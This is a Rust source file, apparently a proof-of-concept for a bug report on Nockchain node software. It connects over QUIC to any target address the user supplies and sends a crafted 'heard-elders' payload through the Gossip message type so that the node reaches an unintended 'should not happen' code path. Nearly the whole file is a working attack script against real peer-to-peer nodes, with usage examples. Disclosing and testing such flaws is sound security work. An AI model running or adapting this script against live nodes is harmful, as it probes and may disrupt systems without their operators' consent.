//! PoC: Send heard-elders via Gossip
//!
//! Demonstrates reaching the "should not happen" code path at driver.rs:1031
//! by sending heard-elders messages via Gossip instead of Request.
//!
//! Usage:
//!   cargo run --release -- /ip4/<TARGET_IP>/udp/<PORT>/quic-v1

use libp2p::{
    futures::StreamExt,
    identity,
    request_response::{self, cbor, ProtocolSupport},
    swarm::SwarmEvent,
    Multiaddr, PeerId, StreamProtocol,
};
use nockapp::noun::slab::NounSlab;
use nockvm::ext::AtomExt;
use nockvm::noun::{Atom, D, T};
use serde::{Deserialize, Serialize};
use serde_bytes::ByteBuf;
use std::{env, time::Duration};
use tokio::time::timeout;

const REQ_RES_PROTOCOL: &str = "/nockchain-1-req-res";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NockchainRequest {
    Request {
        pow: [u8; 16],
        nonce: u64,
        message: ByteBuf,
    },
    Gossip {
        message: ByteBuf,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NockchainResponse {
    Result { message: ByteBuf },
    Ack { acked: bool },
}

/// Create a heard-elders JAM payload with specified number of IDs
fn create_heard_elders(num_ids: usize) -> Vec<u8> {
    let mut slab: NounSlab = NounSlab::new();

    let heard_elders_atom = Atom::from_bytes(&mut slab, b"heard-elders");

    let mut elder_list = D(0);

    for i in 0..num_ids {
        // Each elder_id is [u64 u64 u64 u64 u64] - a tip5 hash
        let hash = T(
            &mut slab,
            &[
                D((i % 256) as u64),
                D(((i / 256) % 256) as u64),
                D(((i / 65536) % 256) as u64),
                D(((i / 16777216) % 256) as u64),
                D(i as u64),
            ],
        );
        elder_list = T(&mut slab, &[hash, elder_list]);
    }

    let oldest = D(0);
    let elders_dat = T(&mut slab, &[oldest, elder_list]);
    let heard_elders = T(&mut slab, &[heard_elders_atom.as_noun(), elders_dat]);

    slab.set_root(heard_elders);
    slab.jam().to_vec()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_env_filter("warn")
        .init();

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("PoC: Send heard-elders via Gossip");
        eprintln!();
        eprintln!("Demonstrates reaching unexpected code path at driver.rs:1031");
        eprintln!();
        eprintln!("Usage: {} <target-multiaddr> [num_ids]", args[0]);
        eprintln!();
        eprintln!("Example:");
        eprintln!("  {} /ip4/192.168.0.171/udp/3000/quic-v1", args[0]);
        eprintln!("  {} /ip4/192.168.0.171/udp/3000/quic-v1 100", args[0]);
        std::process::exit(1);
    }

    let target_addr: Multiaddr = args[1].parse()?;
    let num_elder_ids = args.get(2)
        .and_then(|s| s.parse().ok())
        .unwrap_or(50);

    println!("Target: {}", target_addr);
    println!("Elder IDs: {}", num_elder_ids);
    println!();

    let payload = create_heard_elders(num_elder_ids);
    println!("Payload size: {} bytes", payload.len());

    let local_key = identity::Keypair::generate_ed25519();
    let local_peer_id = PeerId::from(local_key.public());
    println!("Local Peer ID: {}", local_peer_id);

    let gossip_request = NockchainRequest::Gossip {
        message: ByteBuf::from(payload),
    };

    let mut swarm = libp2p::SwarmBuilder::with_existing_identity(local_key)
        .with_tokio()
        .with_quic()
        .with_behaviour(|_key| {
            let protocol = StreamProtocol::new(REQ_RES_PROTOCOL);
            let cfg = request_response::Config::default()
                .with_request_timeout(Duration::from_secs(30));

            cbor::Behaviour::<NockchainRequest, NockchainResponse>::new(
                [(protocol, ProtocolSupport::Full)],
                cfg,
            )
        })?
        .with_swarm_config(|c: libp2p::swarm::Config| {
            c.with_idle_connection_timeout(Duration::from_secs(60))
        })
        .build();

    swarm.dial(target_addr.clone())?;

    loop {
        match timeout(Duration::from_secs(10), swarm.select_next_some()).await {
            Ok(event) => match event {
                SwarmEvent::ConnectionEstablished { peer_id, .. } => {
                    println!("Connected to {}", peer_id);
                    swarm.behaviour_mut().send_request(&peer_id, gossip_request.clone());
                    println!("Sent heard-elders via Gossip");
                }
                SwarmEvent::Behaviour(request_response::Event::Message { message, .. }) => {
                    if let request_response::Message::Response { response, .. } = message {
                        println!("Got response: {:?}", response);
                        break;
                    }
                }
                SwarmEvent::Behaviour(request_response::Event::OutboundFailure { error, .. }) => {
                    println!("Request failed: {:?}", error);
                    break;
                }
                SwarmEvent::ConnectionClosed { cause, .. } => {
                    println!("Connection closed: {:?}", cause);
                    break;
                }
                _ => {}
            },
            Err(_) => {
                println!("Timeout");
                break;
            }
        }
    }

    println!("\nCheck server logs for: \"Heard elders over gossip, should not happen!\"");
    Ok(())
}
